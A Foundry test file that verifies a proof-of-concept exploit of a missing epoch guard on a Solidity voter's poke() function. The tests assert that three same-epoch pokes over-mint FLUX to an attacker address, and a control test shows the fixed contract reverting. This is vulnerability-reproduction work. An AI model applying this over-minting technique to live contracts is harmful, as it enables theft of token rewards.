// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    Voter,
    VoterFixed,
    FluxToken,
    VotingEscrow,
    MiniToken
} from "./38189-lack-of-access-control-in-poke-function-allows-in-unlimited.sol";

contract PokeMissingEpochGuardTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant TOKEN_ID = 1;
    uint256 internal constant DURATION = 2 weeks;

    function test_exploit_pokeReAccruesFluxWithinOneEpoch() public {
        Exploit e = new Exploit();
        e.run();

        // Legitimate per-epoch entitlement is 1x claimableFlux (1 ether here).
        assertEq(e.claimablePerCall(), 1 ether, "one-epoch entitlement");

        // poke() lacks onlyNewEpoch, so 3 pokes in one epoch credit 3x that amount.
        assertEq(e.pokeCount(), 3, "three pokes in one epoch");
        assertEq(e.buggyUnclaimed(), 3 ether, "unclaimedFlux == 3x per-epoch entitlement");
        assertEq(e.buggyUnclaimed(), 3 * e.claimablePerCall(), "over-mint == pokeCount x entitlement");

        // Strictly more than a single epoch's honest accrual -> invariant broken.
        assertGt(e.buggyUnclaimed(), e.claimablePerCall(), "credited more FLUX than earned in the epoch");

        // The illegitimate excess (2 ether) is over-minted from nothing.
        assertEq(e.excessOverMint(), 2 ether, "excess over-mint above one epoch");

        // Read the real over-mint straight from the FluxToken accounting.
        FluxToken flux = FluxToken(e.fluxAddr());
        assertEq(flux.getUnclaimedFlux(TOKEN_ID), 3 ether, "FluxToken records the 3x accrual");

        // Marker records the harm magnitude at the attacker EOA (Playground measures this).
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(ATTACKER), 2 ether, "attacker credited the over-minted FLUX");
        assertEq(e.attackerMarkerBalance(), 2 ether, "exposed marker balance matches");
    }

    // Negative control: with the onlyNewEpoch guard restored on poke() (VoterFixed),
    // the accrual is capped at exactly 1x per epoch. The second same-epoch poke reverts,
    // proving the harm is caused by the MISSING modifier, not the test setup.
    function test_control_fixedPokeCapsAccrualAtOneEpoch() public {
        // Move into a real epoch so the FIRST guarded poke passes the epoch check
        // (default timestamp of 1 would make (t/DURATION)*DURATION == 0, blocking even
        //  the first call).
        vm.warp(DURATION);

        VotingEscrow escrow = new VotingEscrow();
        FluxToken flux = new FluxToken(address(escrow));
        VoterFixed voter = new VoterFixed(address(escrow), address(flux));
        flux.setVoter(address(voter));
        escrow.setToken(TOKEN_ID, ATTACKER, 2 ether); // claimableFlux == 1 ether

        // First guarded poke accrues exactly one epoch's entitlement.
        voter.poke(TOKEN_ID);
        assertEq(flux.getUnclaimedFlux(TOKEN_ID), 1 ether, "guarded poke accrues 1x");

        // Second poke in the SAME epoch reverts on the restored guard.
        vm.expectRevert(bytes("TOKEN_ALREADY_VOTED_THIS_EPOCH"));
        voter.poke(TOKEN_ID);

        // Accrual stays capped at 1x — no over-mint under the fix.
        assertEq(flux.getUnclaimedFlux(TOKEN_ID), 1 ether, "fixed path capped at one epoch");
    }
}
